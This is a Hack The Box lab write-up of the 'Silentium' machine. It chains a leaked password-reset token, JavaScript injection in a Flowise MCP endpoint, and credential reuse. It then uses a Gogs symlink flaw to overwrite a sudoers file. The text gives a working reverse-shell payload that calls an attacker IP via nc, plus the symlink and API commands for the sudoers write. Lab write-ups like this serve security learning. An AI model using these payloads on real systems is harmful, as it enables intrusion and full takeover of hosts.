---
title: HTB Silentium Writeup
date: 2026-07-16
categories: [HTB]
tags: [Linux, Flowise, MCP, RCE, Gogs, Symlink, Privilege-Escalation]
---

---

# Overview

Silentium is a Linux machine that involves exploiting multiple vulnerabilities to gain full system compromise. The attack begins by discovering a staging virtual host and abusing a password reset vulnerability that exposes reset tokens. After resetting a user's password, a vulnerable MCP endpoint in Flowise is leveraged to achieve remote code execution.

Once access is obtained, environment variables reveal additional credentials that provide SSH access as a valid user. During privilege escalation, an internally hosted Gogs instance is identified. By abusing a symlink vulnerability in Gogs, it becomes possible to overwrite a sudoers file and gain passwordless sudo access, ultimately leading to root compromise.

---

# Reconnaissance

The first step was to perform a service and version scan against the target.

```bash
nmap -sV -sC 10.129.25.70
```

The scan identified the available services and provided a baseline for further enumeration.

---

# Web Enumeration

## Virtual Host Discovery

Since web applications often expose additional functionality through virtual hosts, virtual host fuzzing was performed against the target.

```bash
gobuster vhost -u http://silentium.htb -w /usr/share/wordlists/dirb/common.txt --append-domain
```

The scan revealed an additional virtual host.

```text
staging.silentium.htb
```

The discovery of a staging environment was significant because development and staging instances frequently contain weaker security controls or unpatched functionality.

## Password Reset Vulnerability

While reviewing the application's functionality, a password reset issue was identified.

A request sent to the password reset endpoint exposed the reset token within the response.

```http
POST /api/v1/account/forgot-password
```

Using the disclosed token, the password for the user account below was reset:

```text
ben@silentium.htb
```

This provided access to authenticated functionality within the staging application.

---

# Exploitation

## Remote Code Execution via Custom MCP Endpoint

After obtaining authenticated access, a vulnerable MCP endpoint was identified that allowed arbitrary JavaScript execution through the `mcpServerConfig` parameter.

A malicious payload was created to execute a reverse shell.

```bash
mousepad payload.json
```

```json
{
  "loadMethod": "listActions",
  "inputs": {
    "mcpServerConfig": "({x:(function(){const cp=process.mainModule.require('child_process');cp.exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.15.40 4444 >/tmp/f');return 1;})()} )"
  }
}
```

A listener was started on the attacking machine.

```bash
nc -lvnp 4444
```

The payload was then submitted to the vulnerable endpoint.

```bash
curl -X POST http://staging.silentium.htb/api/v1/node-load-method/customMCP \
     -H "Authorization: Bearer hWp_8jB76zi0VtKSr2d9TfGK1fm6NuNPg1uA-8FsUJc" \
     -H "Content-Type: application/json" \
     -d @payload.json
```

Successful execution resulted in a reverse shell on the target.

---

# Initial Access

## Credential Discovery

After obtaining code execution, environment variables were reviewed in search of sensitive information.

```bash
env
```

The following credential was discovered.

```text
SMTP_PASSWORD=r04D!!_R4ge
```

Since passwords are frequently reused across services, the credential was tested against SSH.

```bash
ssh ben@silentium.htb
```

```text
Password: r04D!!_R4ge
```

The login was successful, providing a stable shell as the user `ben`.

The user flag could then be retrieved.

```bash
cat user.txt
```

```text
[REDACTED]
```

---

# Privilege Escalation

## Discovering an Internal Gogs Instance

While enumerating the system, files related to Gogs were identified.

```bash
find /opt/gogs -type f 2>/dev/null | grep app.ini
```

```text
/opt/gogs/gogs/custom/conf/app.ini
```

Local services were then inspected.

```bash
ss -lntp | grep -E '3001|8080'
```

A request confirmed that a service was listening locally on port 3001.

```bash
curl -I http://127.0.0.1:3001
```

Since the service was only accessible locally, SSH port forwarding was used.

```bash
ssh -L 3001:127.0.0.1:3001 ben@silentium.htb
```

After forwarding the port, the web interface became accessible locally.

```text
http://127.0.0.1:3001
```

A new user and repository were created.

```text
Username: test
Password: Password@123
Repository: newrepo
```

An API token was then generated from the Gogs interface.

```text
7bd75e68f611b80063b87add50cd9125c0ec44cd
```

## Exploiting the Gogs Symlink Vulnerability

The repository was cloned locally.

```bash
git clone http://test:Password%40123@127.0.0.1:3001/test/newrepo.git
```

```bash
cd newrepo
```

A symbolic link targeting the sudoers configuration for the user `ben` was created.

```bash
ln -s /etc/sudoers.d/ben malicious_link
```

Git configuration was updated before committing the changes.

```bash
git config --global user.name "JINX"
```

```bash
git config --global user.email "jinx@htb.local"
```

The symlink was added, committed, and pushed.

```bash
git add malicious_link
```

```bash
git commit -m "Add symlink"
```

```bash
git push -u origin master
```

The repository contents were verified.

```bash
git ls-files -s
```

Using the generated API token, the repository API was abused to write arbitrary content through the symlink.

```bash
curl -X PUT \
  "http://127.0.0.1:3001/api/v1/repos/test/newrepo/contents/malicious_link" \
  -H "Authorization: token 7bd75e68f611b80063b87add50cd9125c0ec44cd" \
  -H "Content-Type: application/json" \
  -d '{
    "message":"Exploit",
    "content":"YmVuIEFMTD0oQUxMKSBOT1BBU1NXRDogQUxMCg=="
  }'
```

The Base64-encoded payload added the following rule to the sudoers configuration:

```text
ben ALL=(ALL) NOPASSWD: ALL
```

This granted passwordless sudo access to the user `ben`.

## Obtaining Root

Back on the target, sudo privileges were verified.

```bash
sudo -l
```

```bash
sudo id
```

A root shell was then obtained.

```bash
sudo -i
```

The root flag could finally be retrieved.

```bash
cat /root/root.txt
```

```text
[REDACTED]
```

---

# Conclusion

Silentium demonstrates how multiple seemingly unrelated weaknesses can be chained together for complete system compromise. The attack path involved discovering a staging environment, abusing a password reset vulnerability to gain authenticated access, exploiting a vulnerable MCP implementation for remote code execution, and leveraging exposed credentials to obtain SSH access.

Privilege escalation was achieved by identifying an internal Gogs instance and exploiting a symlink vulnerability to overwrite a sudoers configuration file, ultimately granting passwordless sudo access and full control of the system.
